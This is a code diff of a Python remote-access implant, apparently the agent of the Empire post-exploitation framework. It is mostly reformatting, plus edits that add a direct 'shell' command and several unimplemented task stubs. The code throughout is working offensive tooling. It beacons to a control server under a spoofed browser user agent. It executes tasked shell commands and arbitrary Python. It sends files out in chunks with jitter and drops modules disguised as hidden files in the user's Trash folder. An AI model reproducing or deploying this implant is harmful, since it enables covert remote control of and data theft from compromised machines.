@@ -37,46 +37,46 @@ from threading import Thread
 #   tasking uris | user agent | additional header 1 | additional header 2 | ...
 profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
 
-if server.endswith("/"): server = server[0:-1]
+if server.endswith("/"):
+    server = server[0:-1]
 
 delay = 60
 jitter = 0.0
 lostLimit = 60
 missedCheckins = 0
-jobMessageBuffer = ''
+jobMessageBuffer = ""
 currentListenerName = ""
 sendMsgFuncCode = ""
 proxy_list = []
 
 # killDate form -> "MO/DAY/YEAR"
-killDate = 'REPLACE_KILLDATE'
+killDate = "REPLACE_KILLDATE"
 # workingHours form -> "9:00-17:00"
-workingHours = 'REPLACE_WORKINGHOURS'
+workingHours = "REPLACE_WORKINGHOURS"
 
-parts = profile.split('|')
-taskURIs = parts[0].split(',')
+parts = profile.split("|")
+taskURIs = parts[0].split(",")
 userAgent = parts[1]
 headersRaw = parts[2:]
 
 defaultResponse = base64.b64decode("")
 
-jobs = []
+jobs = {}
 moduleRepo = {}
 _meta_cache = {}
 
 # global header dictionary
 #   sessionID is set by stager.py
 # headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}
-headers = {'User-Agent': userAgent}
+headers = {"User-Agent": userAgent}
 
 # parse the headers into the global header dictionary
 for headerRaw in headersRaw:
     try:
-        headerKey = headerRaw.split(":")[0]
-        headerValue = headerRaw.split(":")[1]
+        headerKey, headerValue = headerRaw.split(":")[:2]
 
         if headerKey.lower() == "cookie":
-            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
+            headers["Cookie"] = "%s;%s" % (headers["Cookie"], headerValue)
         else:
             headers[headerKey] = headerValue
     except:
@@ -123,23 +123,25 @@ def build_response_packet(taskingID, packetData, resultID=0):
         |  2   |         2          |    2     |    2    |   4    | <Length>  |
         +------+--------------------+----------+---------+--------+-----------+
     """
-    packetType = struct.pack('=H', taskingID)
-    totalPacket = struct.pack('=H', 1)
-    packetNum = struct.pack('=H', 1)
-    resultID = struct.pack('=H', resultID)
+    packetType = struct.pack("=H", taskingID)
+    totalPacket = struct.pack("=H", 1)
+    packetNum = struct.pack("=H", 1)
+    resultID = struct.pack("=H", resultID)
 
     if packetData:
-        if (isinstance(packetData, str)):
-            packetData = base64.b64encode(packetData.encode('utf-8', 'ignore'))
+        if isinstance(packetData, str):
+            packetData = base64.b64encode(packetData.encode("utf-8", "ignore"))
         else:
-            packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8', 'ignore'))
+            packetData = base64.b64encode(
+                packetData.decode("utf-8").encode("utf-8", "ignore")
+            )
         if len(packetData) % 4:
-            packetData += '=' * (4 - len(packetData) % 4)
+            packetData += "=" * (4 - len(packetData) % 4)
 
-        length = struct.pack('=L', len(packetData))
+        length = struct.pack("=L", len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
-        length = struct.pack('=L', 0)
+        length = struct.pack("=L", 0)
         return packetType + totalPacket + packetNum + resultID + length
 
 
@@ -165,15 +167,23 @@ def parse_task_packet(packet, offset=0):
     Returns a tuple with (responseName, totalPackets, packetNum, resultID, length, data, remainingData)
     """
     try:
-        packetType = struct.unpack('=H', packet[0 + offset:2 + offset])[0]
-        totalPacket = struct.unpack('=H', packet[2 + offset:4 + offset])[0]
-        packetNum = struct.unpack('=H', packet[4 + offset:6 + offset])[0]
-        resultID = struct.unpack('=H', packet[6 + offset:8 + offset])[0]
-        length = struct.unpack('=L', packet[8 + offset:12 + offset])[0]
-        packetData = packet.decode('UTF-8')[12 + offset:12 + offset + length]
-        remainingData = packet.decode('UTF-8')[12 + offset + length:]
+        packetType = struct.unpack("=H", packet[0 + offset : 2 + offset])[0]
+        totalPacket = struct.unpack("=H", packet[2 + offset : 4 + offset])[0]
+        packetNum = struct.unpack("=H", packet[4 + offset : 6 + offset])[0]
+        resultID = struct.unpack("=H", packet[6 + offset : 8 + offset])[0]
+        length = struct.unpack("=L", packet[8 + offset : 12 + offset])[0]
+        packetData = packet.decode("UTF-8")[12 + offset : 12 + offset + length]
+        remainingData = packet.decode("UTF-8")[12 + offset + length :]
 
-        return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
+        return (
+            packetType,
+            totalPacket,
+            packetNum,
+            resultID,
+            length,
+            packetData,
+            remainingData,
+        )
     except Exception as e:
         print("parse_task_packet exception:", e)
         return (None, None, None, None, None, None, None)
@@ -185,9 +195,17 @@ def process_tasking(data):
     #   -extracts the packets and processes each
     try:
         # aes_decrypt_and_verify is in stager.py
-        tasking = aes_decrypt_and_verify(key, data).encode('UTF-8')
+        tasking = aes_decrypt_and_verify(key, data).encode("UTF-8")
 
-        (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
+        (
+            packetType,
+            totalPacket,
+            packetNum,
+            resultID,
+            length,
+            data,
+            remainingData,
+        ) = parse_task_packet(tasking)
 
         # if we get to this point, we have a legit tasking so reset missedCheckins
         missedCheckins = 0
@@ -200,9 +218,16 @@ def process_tasking(data):
             resultPackets += result
 
         packetOffset = 12 + length
-        while remainingData and remainingData != '':
-            (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking,
-                                                                                                            offset=packetOffset)
+        while remainingData and remainingData != "":
+            (
+                packetType,
+                totalPacket,
+                packetNum,
+                resultID,
+                length,
+                data,
+                remainingData,
+            ) = parse_task_packet(tasking, offset=packetOffset)
             result = process_packet(packetType, data, resultID)
             if result:
                 resultPackets += result
@@ -260,7 +285,7 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(40, resultData, resultID))
         else:
             cmd = parts[0]
-            cmdargs = ' '.join(parts[1:len(parts)])
+            cmdargs = " ".join(parts[1 : len(parts)])
             resultData = str(run_command(cmd, cmdargs=cmdargs))
             send_message(build_response_packet(40, resultData, resultID))
 
@@ -269,7 +294,11 @@ def process_packet(packetType, data, resultID):
         objPath = os.path.abspath(data)
         fileList = []
         if not os.path.exists(objPath):
-            send_message(build_response_packet(40, "file does not exist or cannot be accessed", resultID))
+            send_message(
+                build_response_packet(
+                    40, "file does not exist or cannot be accessed", resultID
+                )
+            )
 
         if not os.path.isdir(objPath):
             fileList.append(objPath)
@@ -294,23 +323,17 @@ def process_packet(packetType, data, resultID):
                 start_crc32 = c.crc32_data(encodedPart)
                 comp_data = c.comp_data(encodedPart)
                 encodedPart = c.build_header(comp_data, start_crc32)
-                encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
+                encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
 
                 partData = "%s|%s|%s|%s" % (partIndex, filePath, size, encodedPart)
-                if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
+                if not encodedPart or encodedPart == "" or len(encodedPart) == 16:
                     break
 
                 send_message(build_response_packet(41, partData, resultID))
 
                 global delay
                 global jitter
-                if jitter < 0: jitter = -jitter
-                if jitter > 1: jitter = old_div(1, jitter)
-
-                minSleep = int((1.0 - jitter) * delay)
-                maxSleep = int((1.0 + jitter) * delay)
-                sleepTime = random.randint(minSleep, maxSleep)
-                time.sleep(sleepTime)
+                time.sleep(sleep_time(jitter))
                 partIndex += 1
                 offset += 512000
 
@@ -321,76 +344,118 @@ def process_packet(packetType, data, resultID):
             filePath = parts[0]
             base64part = parts[1]
             raw = base64.b64decode(base64part)
-            with open(filePath, 'ab') as f:
+            with open(filePath, "ab") as f:
                 f.write(raw)
-            send_message(build_response_packet(42, "[*] Upload of %s successful" % (filePath), resultID))
+            send_message(
+                build_response_packet(
+                    42, "[*] Upload of %s successful" % (filePath), resultID
+                )
+            )
         except Exception as e:
-            send_message(build_response_packet(0, "[!] Error in writing file %s during upload: %s" % (filePath, str(e)), resultID))
+            send_message(
+                build_response_packet(
+                    0,
+                    "[!] Error in writing file %s during upload: %s"
+                    % (filePath, str(e)),
+                    resultID,
+                )
+            )
 
     elif packetType == 43:
         # directory list
         cmdargs = data
 
-        path = '/'  # default to root
-        if cmdargs is not None and cmdargs != '' and cmdargs != '/':  # strip trailing slash for uniformity
-            path = cmdargs.rstrip('/')
-        if path[0] != '/':  # always scan relative to root for uniformity
-            path = '/{0}'.format(path)
+        path = "/"  # default to root
+        if (
+            cmdargs is not None and cmdargs != "" and cmdargs != "/"
+        ):  # strip trailing slash for uniformity
+            path = cmdargs.rstrip("/")
+        if path[0] != "/":  # always scan relative to root for uniformity
+            path = "/{0}".format(path)
         if not os.path.isdir(path):
-            send_message(build_response_packet(43, 'Directory {} not found.'.format(path), resultID))
+            send_message(
+                build_response_packet(
+                    43, "Directory {} not found.".format(path), resultID
+                )
+            )
         items = []
         with os.scandir(path) as it:
             for entry in it:
-                items.append({'path': entry.path, 'name': entry.name, 'is_file': entry.is_file()})
+                items.append(
+                    {"path": entry.path, "name": entry.name, "is_file": entry.is_file()}
+                )
 
-        result_data = json.dumps({
-            'directory_name': path if len(path) == 1 else path.split('/')[-1],
-            'directory_path': path,
-            'items': items
-        })
+        result_data = json.dumps(
+            {
+                "directory_name": path if len(path) == 1 else path.split("/")[-1],
+                "directory_path": path,
+                "items": items,
+            }
+        )
 
         send_message(build_response_packet(43, result_data, resultID))
 
+    elif packetType == 44:
+        # run csharp module in ironpython using reflection
+        send_message(
+            build_response_packet(
+                60, "[!] C# module execution not implemented", resultID
+            )
+        )
+
     elif packetType == 50:
         # return the currently running jobs
-        msg = ""
-        if len(jobs) == 0:
-            msg = "No active jobs"
-        else:
-            msg = "Active jobs:\n"
-            for x in range(len(jobs)):
-                msg += "\t%s" % (x)
+        msg = "Active jobs:\n"
+
+        for key in jobs:
+            msg += "Task %s" % key
         send_message(build_response_packet(50, msg, resultID))
 
     elif packetType == 51:
         # stop and remove a specified job if it's running
         try:
-            # Calling join first seems to hang
-            # result = jobs[int(data)].join()
-            send_message(build_response_packet(0, "[*] Attempting to stop job thread", resultID))
-            result = jobs[int(data)].kill()
-            send_message(build_response_packet(0, "[*] Job thread stoped!", resultID))
-            jobs[int(data)]._Thread__stop()
+            jobs[int(data)].kill()
             jobs.pop(int(data))
-            if result and result != "":
-                send_message(build_response_packet(51, result, resultID))
-        except:
-            return build_response_packet(0, "error stopping job: %s" % (data), resultID)
+            send_message(
+                build_response_packet(
+                    51, "[+] Job thread %s stopped successfully" % (data), resultID
+                )
+            )
+        except Exception as e:
+            send_message(
+                build_response_packet(
+                    51, "[!] Error stopping job thread: %s" % (e), resultID
+                )
+            )
+
+    elif packetType == 60:
+        send_message(
+            build_response_packet(60, "[!] SOCKS server not implemented", resultID)
+        )
+
+    elif packetType == 61:
+        send_message(
+            build_response_packet(0, "[!] SOCKS server data not implemented", resultID)
+        )
 
     elif packetType == 100:
-        # dynamic code execution, wait for output, don't save outputPicl
+        # dynamic code execution, wait for output, don't save output
         try:
             buffer = StringIO()
             sys.stdout = buffer
-            code_obj = compile(data, '<string>', 'exec')
+            code_obj = compile(data, "<string>", "exec")
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
             send_message(build_response_packet(100, str(results), resultID))
         except Exception as e:
             errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" % (
-            e, errorData), resultID)
+            return build_response_packet(
+                0,
+                "error executing specified Python data: %s \nBuffer data recovered:\n%s"
+                % (e, errorData),
+                resultID,
+            )
 
     elif packetType == 101:
         # dynamic code execution, wait for output, save output
@@ -400,37 +465,50 @@ def process_packet(packetType, data, resultID):
         try:
             buffer = StringIO()
             sys.stdout = buffer
-            code_obj = compile(data, '<string>', 'exec')
+            code_obj = compile(data, "<string>", "exec")
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
-            results = buffer.getvalue().encode('latin-1')
+            results = buffer.getvalue().encode("latin-1")
             c = compress()
             start_crc32 = c.crc32_data(results)
             comp_data = c.comp_data(results)
             encodedPart = c.build_header(comp_data, start_crc32)
-            encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
+            encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
             send_message(
-                build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart,
-                                      resultID))
+                build_response_packet(
+                    101,
+                    "{0: <15}".format(prefix)
+                    + "{0: <5}".format(extension)
+                    + encodedPart,
+                    resultID,
+                )
+            )
         except Exception as e:
             # Also return partial code that has been executed
             errorData = buffer.getvalue()
-            send_message(build_response_packet(0,
-                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
-                                               e, errorData), resultID))
+            send_message(
+                build_response_packet(
+                    0,
+                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
+                    % (e, errorData),
+                    resultID,
+                )
+            )
 
     elif packetType == 102:
         # on disk code execution for modules that require multiprocessing not supported by exec
         try:
-            implantHome = expanduser("~") + '/.Trash/'
+            implantHome = expanduser("~") + "/.Trash/"
             moduleName = ".mac-debug-data"
             implantPath = implantHome + moduleName
             result = "[*] Module disk path: %s \n" % (implantPath)
-            with open(implantPath, 'w') as f:
+            with open(implantPath, "w") as f:
                 f.write(data)
             result += "[*] Module properly dropped to disk \n"
             pythonCommand = "python %s" % (implantPath)
-            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
+            process = subprocess.Popen(
+                pythonCommand, stdout=subprocess.PIPE, shell=True
+            )
             data = process.communicate()
             result += data[0].strip()
             try:
@@ -440,15 +518,26 @@ def process_packet(packetType, data, resultID):
                 print("error removing module filed: %s" % (e))
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
-                result += "\n\nError removing module file, please verify path: " + str(implantPath)
+                result += "\n\nError removing module file, please verify path: " + str(
+                    implantPath
+                )
             send_message(build_response_packet(100, str(result), resultID))
         except Exception as e:
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
-                send_message(build_response_packet(0,
-                                                   "error executing specified Python data: %s \nError removing module file, please verify path: %s" % (
-                                                   e, implantPath), resultID))
-            send_message(build_response_packet(0, "error executing specified Python data: %s" % (e), resultID))
+                send_message(
+                    build_response_packet(
+                        0,
+                        "error executing specified Python data: %s \nError removing module file, please verify path: %s"
+                        % (e, implantPath),
+                        resultID,
+                    )
+                )
+            send_message(
+                build_response_packet(
+                    0, "error executing specified Python data: %s" % (e), resultID
+                )
+            )
 
     elif packetType == 110:
         start_job(data, resultID)
@@ -458,45 +547,81 @@ def process_packet(packetType, data, resultID):
         # TODO: implement job structure
         pass
 
+    elif packetType == 112:
+        # powershell task
+        send_message(
+            build_response_packet(60, "[!] PowerShell tasks not implemented", resultID)
+        )
+
+    elif packetType == 118:
+        # PowerShel Task - dynamic code execution, wait for output, don't save output
+        send_message(
+            build_response_packet(60, "[!] PowerShell tasks not implemented", resultID)
+        )
+
+    elif packetType == 119:
+        pass
+
     elif packetType == 121:
         # base64 decode the script and execute
         script = base64.b64decode(data)
         try:
             buffer = StringIO()
             sys.stdout = buffer
-            code_obj = compile(script, '<string>', 'exec')
+            code_obj = compile(script, "<string>", "exec")
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             result = str(buffer.getvalue())
             send_message(build_response_packet(121, result, resultID))
         except Exception as e:
             errorData = str(buffer.getvalue())
-            send_message(build_response_packet(0,
-                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
-                                               e, errorData), resultID))
+            send_message(
+                build_response_packet(
+                    0,
+                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
+                    % (e, errorData),
+                    resultID,
+                )
+            )
 
     elif packetType == 122:
         # base64 decode and decompress the data
         try:
-            parts = data.split('|')
+            parts = data.split("|")
             base64part = parts[1]
             fileName = parts[0]
             raw = base64.b64decode(base64part)
             d = decompress()
             dec_data = d.dec_data(raw, cheader=True)
-            if not dec_data['crc32_check']:
-                send_message(build_response_packet(122, "Failed crc32_check during decompression", resultID))
+            if not dec_data["crc32_check"]:
+                send_message(
+                    build_response_packet(
+                        122, "Failed crc32_check during decompression", resultID
+                    )
+                )
         except Exception as e:
-            send_message(build_response_packet(122, "Unable to decompress zip file: %s" % (e), resultID))
+            send_message(
+                build_response_packet(
+                    122, "Unable to decompress zip file: %s" % (e), resultID
+                )
+            )
 
-        zdata = dec_data['data']
+        zdata = dec_data["data"]
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
         if fileName in list(moduleRepo.keys()):
-            send_message(build_response_packet(122, "%s module already exists" % (fileName), resultID))
+            send_message(
+                build_response_packet(
+                    122, "%s module already exists" % (fileName), resultID
+                )
+            )
         else:
             moduleRepo[fileName] = zf
             install_hook(fileName)
-            send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
+            send_message(
+                build_response_packet(
+                    122, "Successfully imported %s" % (fileName), resultID
+                )
+            )
 
     elif packetType == 123:
         # view loaded modules
@@ -505,13 +630,13 @@ def process_packet(packetType, data, resultID):
             loadedModules = "\nAll Repos\n"
             for key, value in list(moduleRepo.items()):
                 loadedModules += "\n----" + key + "----\n"
-                loadedModules += '\n'.join(moduleRepo[key].namelist())
+                loadedModules += "\n".join(moduleRepo[key].namelist())
 
             send_message(build_response_packet(123, loadedModules, resultID))
         else:
             try:
                 loadedModules = "\n----" + repoName + "----\n"
-                loadedModules += '\n'.join(moduleRepo[repoName].namelist())
+                loadedModules += "\n".join(moduleRepo[repoName].namelist())
                 send_message(build_response_packet(123, loadedModules, resultID))
             except Exception as e:
                 msg = "Unable to retrieve repo contents: %s" % (str(e))
@@ -523,12 +648,38 @@ def process_packet(packetType, data, resultID):
         try:
             remove_hook(repoName)
             del moduleRepo[repoName]
-            send_message(build_response_packet(124, "Successfully remove repo: %s" % (repoName), resultID))
+            send_message(
+                build_response_packet(
+                    124, "Successfully remove repo: %s" % (repoName), resultID
+                )
+            )
         except Exception as e:
-            send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))
+            send_message(
+                build_response_packet(
+                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID
+                )
+            )
+
+    elif packetType == 130:
+        # Dynamically update agent comms
+        send_message(
+            build_response_packet(
+                60, "[!] Switch agent comms not implemented", resultID
+            )
+        )
+
+    elif packetType == 131:
+        # Update the listener name variable
+        send_message(
+            build_response_packet(
+                60, "[!] Switch agent comms not implemented", resultID
+            )
+        )
 
     else:
-        send_message(build_response_packet(0, "invalid tasking ID: %s" % (taskingID), resultID))
+        send_message(
+            build_response_packet(0, "invalid tasking ID: %s" % (packetType), resultID)
+        )
 
 
 def old_div(a, b):
@@ -551,15 +702,18 @@ def old_div(a, b):
 
 # [0] = .py ext, is_package = False
 # [1] = /__init__.py ext, is_package = True
-_search_order = [('.py', False), ('/__init__.py', True)]
+_search_order = [(".py", False), ("/__init__.py", True)]
+
 
 class ZipImportError(ImportError):
     """Exception raised by zipimporter objects."""
+
     pass
 
 
 # _get_info() = takes the fullname, then subpackage name (if applicable),
 # and searches for the respective module or package
+
 
 class CFinder(object):
     """Import Hook for Empire"""
@@ -569,9 +723,9 @@ class CFinder(object):
 
     def _get_info(self, repoName, fullname):
         """Search for the respective package or module in the zipfile object"""
-        parts = fullname.split('.')
+        parts = fullname.split(".")
         submodule = parts[-1]
-        modulepath = '/'.join(parts)
+        modulepath = "/".join(parts)
 
         # check to see if that specific module exists
         for suffix, is_package in _search_order:
@@ -584,16 +738,16 @@ class CFinder(object):
                 return submodule, is_package, relpath
 
         # Error out if we can find the module/package
-        msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
+        msg = "Unable to locate module %s in the %s repo" % (submodule, repoName)
         raise ZipImportError(msg)
 
     def _get_source(self, repoName, fullname):
         """Get the source code for the requested module"""
         submodule, is_package, relpath = self._get_info(repoName, fullname)
-        fullpath = '%s/%s' % (repoName, relpath)
+        fullpath = "%s/%s" % (repoName, relpath)
         source = moduleRepo[repoName].read(relpath)
-        source = source.replace('\r\n', '\n')
-        source = source.replace('\r', '\n')
+        source = source.replace("\r\n", "\n")
+        source = source.replace("\r", "\n")
         return submodule, is_package, fullpath, source
 
     def find_module(self, fullname, path=None):
@@ -606,8 +760,10 @@ class CFinder(object):
             return self
 
     def load_module(self, fullname):
-        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
-        code = compile(source, fullpath, 'exec')
+        submodule, is_package, fullpath, source = self._get_source(
+            self.repoName, fullname
+        )
+        code = compile(source, fullpath, "exec")
         mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
         mod.__loader__ = self
         mod.__file__ = fullpath
@@ -619,14 +775,16 @@ class CFinder(object):
 
     def get_data(self, fullpath):
 
-        prefix = os.path.join(self.repoName, '')
+        prefix = os.path.join(self.repoName, "")
         if not fullpath.startswith(prefix):
-            raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
-        relpath = fullpath[len(prefix):]
+            raise IOError(
+                "Path %r does not start with module name %r", (fullpath, prefix)
+            )
+        relpath = fullpath[len(prefix) :]
         try:
             return moduleRepo[self.repoName].read(relpath)
         except KeyError:
-            raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))
+            raise IOError("Path %r not found in repo %r" % (relpath, self.repoName))
 
     def is_package(self, fullname):
         """Return if the module is a package"""
@@ -634,8 +792,10 @@ class CFinder(object):
         return is_package
 
     def get_code(self, fullname):
-        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
-        return compile(source, fullpath, 'exec')
+        submodule, is_package, fullpath, source = self._get_source(
+            self.repoName, fullname
+        )
+        return compile(source, fullpath, "exec")
 
     def install_hook(repoName):
         if repoName not in _meta_cache:
@@ -655,10 +815,10 @@ class CFinder(object):
 #
 ################################################
 class compress(object):
-    '''
+    """
     Base clase for init of the package. This will handle
     the initial object creation for conducting basic functions.
-    '''
+    """
 
     CRC_HSIZE = 4
     COMP_RATIO = 9
@@ -670,42 +830,42 @@ class compress(object):
         pass
 
     def comp_data(self, data, cvalue=COMP_RATIO):
-        '''
+        """
         Takes in a string and computes
         the comp obj.
         data = string wanting compression
         cvalue = 0-9 comp value (default 6)
-        '''
+        """
         cdata = zlib.compress(data, cvalue)
         return cdata
 
     def crc32_data(self, data):
-        '''
+        """
         Takes in a string and computes crc32 value.
         data = string before compression
         returns:
         HEX bytes of data
-        '''
+        """
         crc = zlib.crc32(data) & 0xFFFFFFFF
         return crc
 
     def build_header(self, data, crc):
-        '''
+        """
         Takes comp data, org crc32 value,
         and adds self header.
         data =  comp data
         crc = crc32 value
-        '''
+        """
         header = struct.pack("!I", crc)
         built_data = header + data
         return built_data
 
 
 class decompress(object):
-    '''
+    """
     Base clase for init of the package. This will handle
     the initial object creation for conducting basic functions.
-    '''
+    """
 
     CRC_HSIZE = 4
     COMP_RATIO = 9
@@ -717,7 +877,7 @@ class decompress(object):
         pass
 
     def dec_data(self, data, cheader=True):
-        '''
+        """
         Takes:
         Custom / standard header data
         data = comp data with zlib header
@@ -725,16 +885,21 @@ class decompress(object):
         returns:
         dict with crc32 cheack and dec data string
         ex. {"crc32" : true, "dec_data" : "-SNIP-"}
-        '''
+        """
         if cheader:
-            comp_crc32 = struct.unpack("!I", data[:self.CRC_HSIZE])[0]
-            dec_data = zlib.decompress(data[self.CRC_HSIZE:])
+            comp_crc32 = struct.unpack("!I", data[: self.CRC_HSIZE])[0]
+            dec_data = zlib.decompress(data[self.CRC_HSIZE :])
             dec_crc32 = zlib.crc32(dec_data) & 0xFFFFFFFF
             if comp_crc32 == dec_crc32:
                 crc32 = True
             else:
                 crc32 = False
-            return {"header_crc32": comp_crc32, "dec_crc32": dec_crc32, "crc32_check": crc32, "data": dec_data}
+            return {
+                "header_crc32": comp_crc32,
+                "dec_crc32": dec_crc32,
+                "crc32_check": crc32,
+                "data": dec_data,
+            }
         else:
             dec_data = zlib.decompress(data)
             return dec_data
@@ -745,7 +910,7 @@ def agent_exit():
     if len(jobs) > 0:
         try:
             for x in jobs:
-                jobs[int(x)].kill()
+                jobs[x].kill()
                 jobs.pop(x)
         except:
             # die hard if thread kill fails
@@ -753,22 +918,24 @@ def agent_exit():
     exit()
 
 
-def indent(lines, amount=4, ch=' '):
+def indent(lines, amount=4, ch=" "):
     padding = amount * ch
-    return padding + ('\n' + padding).join(lines.split('\n'))
+    return padding + ("\n" + padding).join(lines.split("\n"))
 
 
 # from http://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
 class ThreadWithReturnValue(Thread):
-    def __init__(self, group=None, target=None, name=None,
-                 args=(), kwargs={}, Verbose=None):
+    def __init__(
+        self, group=None, target=None, name=None, args=(), kwargs={}, Verbose=None
+    ):
         Thread.__init__(self, group, target, name, args, kwargs, Verbose)
         self._return = None
 
     def run(self):
         if self._Thread__target is not None:
-            self._return = self._Thread__target(*self._Thread__args,
-                                                **self._Thread__kwargs)
+            self._return = self._Thread__target(
+                *self._Thread__args, **self._Thread__kwargs
+            )
 
     def join(self):
         Thread.join(self)
@@ -777,7 +944,7 @@ class ThreadWithReturnValue(Thread):
 
 class KThread(threading.Thread):
     """A subclass of threading.Thread, with a kill()
-  method."""
+    method."""
 
     def __init__(self, *args, **keywords):
         threading.Thread.__init__(self, *args, **keywords)
@@ -786,25 +953,25 @@ class KThread(threading.Thread):
     def start(self):
         """Start the thread."""
         self.__run_backup = self.run
-        self.run = self.__run  # Force the Thread toinstall our trace.
+        self.run = self.__run  # Force the Thread to install our trace.
         threading.Thread.start(self)
 
     def __run(self):
         """Hacked run function, which installs the
-    trace."""
+        trace."""
         sys.settrace(self.globaltrace)
         self.__run_backup()
         self.run = self.__run_backup
 
     def globaltrace(self, frame, why, arg):
-        if why == 'call':
+        if why == "call":
             return self.localtrace
         else:
             return None
 
     def localtrace(self, frame, why, arg):
         if self.killed:
-            if why == 'line':
+            if why == "line":
                 raise SystemExit()
         return self.localtrace
 
@@ -819,7 +986,7 @@ def start_job(code, resultID):
     codeBlock = "def method():\n" + indent(code[1:])
 
     # register the code block
-    code_obj = compile(codeBlock, '<string>', 'exec')
+    code_obj = compile(codeBlock, "<string>", "exec")
     # code needs to be in the global listing
     # not the locals() scope
     exec(code_obj, globals())
@@ -829,7 +996,7 @@ def start_job(code, resultID):
     codeThread = KThread(target=job_func, args=(resultID,))
     codeThread.start()
 
-    jobs.append(codeThread)
+    jobs[resultID] = codeThread
 
 
 def job_func(resultID):
@@ -906,7 +1073,7 @@ def data_webserver(data, ip, port, serveCount):
     server_class = http.server.HTTPServer
     httpServer = server_class((hostName, portNumber), serverHandler)
     try:
-        while (count < serveCount):
+        while count < serveCount:
             httpServer.handle_request()
             count += 1
     except:
@@ -916,16 +1083,16 @@ def data_webserver(data, ip, port, serveCount):
 
 
 def permissions_to_unix_name(st_mode):
-    permstr = ''
-    usertypes = ['USR', 'GRP', 'OTH']
+    permstr = ""
+    usertypes = ["USR", "GRP", "OTH"]
     for usertype in usertypes:
-        perm_types = ['R', 'W', 'X']
+        perm_types = ["R", "W", "X"]
         for permtype in perm_types:
-            perm = getattr(stat, 'S_I%s%s' % (permtype, usertype))
+            perm = getattr(stat, "S_I%s%s" % (permtype, usertype))
             if st_mode & perm:
                 permstr += permtype.lower()
             else:
-                permstr += '-'
+                permstr += "-"
     return permstr
 
 
@@ -947,37 +1114,52 @@ def directory_listing(path):
         group = grp.getgrgid(fstat.st_gid)[0]
 
         # Convert file size to MB, KB or Bytes
-        if (fstat.st_size > 1024 * 1024):
-            fsize = math.ceil(old_div(fstat.st_size, (1024 * 1024)))
-            unit = "MB"
-        elif (fstat.st_size > 1024):
-            fsize = math.ceil(old_div(fstat.st_size, 1024))
+        fsize = fstat.st_size
+        unit = "B"
+
+        if fsize > 1024:
+            fsize >>= 10
             unit = "KB"
-        else:
-            fsize = fstat.st_size
-            unit = "B"
+
+        if fsize > 1024:
+            fsize >>= 10
+            unit = "MB"
 
         mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
 
-        res += '{} {} {} {:18s} {:f} {:2s} {:15.15s}\n'.format(permstr, user, group, mtime, fsize, unit, fn)
+        res += "{} {} {} {:18s} {:f} {:2s} {:15.15s}\n".format(
+            permstr, user, group, mtime, fsize, unit, fn
+        )
 
     return res
 
 
 # additional implementation methods
 def run_command(command, cmdargs=None):
-    if re.compile("(ls|dir)").match(command):
+    if command == "shell":
+        if cmdargs is None:
+            return "no shell command supplied"
+
+        p = subprocess.Popen(
+            cmdargs,
+            stdin=None,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            shell=True,
+        )
+        return p.communicate()[0].strip().decode("UTF-8")
+    elif re.compile("(ls|dir)").match(command):
         if cmdargs == None or not os.path.exists(cmdargs):
-            cmdargs = '.'
+            cmdargs = "."
 
         return directory_listing(cmdargs)
-    if re.compile("cd").match(command):
+    elif re.compile("cd").match(command):
         os.chdir(cmdargs)
         return str(os.getcwd())
     elif re.compile("pwd").match(command):
         return str(os.getcwd())
     elif re.compile("rm").match(command):
-        if cmdargs == None:
+        if cmdargs is None:
             return "please provide a file or directory"
 
         if os.path.exists(cmdargs):
@@ -992,7 +1174,7 @@ def run_command(command, cmdargs=None):
         else:
             return "specified file/directory does not exist"
     elif re.compile("mkdir").match(command):
-        if cmdargs == None:
+        if cmdargs is None:
             return "please provide a directory"
 
         os.mkdir(cmdargs)
@@ -1005,18 +1187,24 @@ def run_command(command, cmdargs=None):
         return str(socket.gethostname())
 
     else:
-        if cmdargs != None:
+        if cmdargs is not None:
             command = "{} {}".format(command, cmdargs)
 
-        p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-        return p.communicate()[0].strip().decode('UTF-8')
+        p = subprocess.Popen(
+            command,
+            stdin=None,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            shell=True,
+        )
+        return p.communicate()[0].strip().decode("UTF-8")
 
 
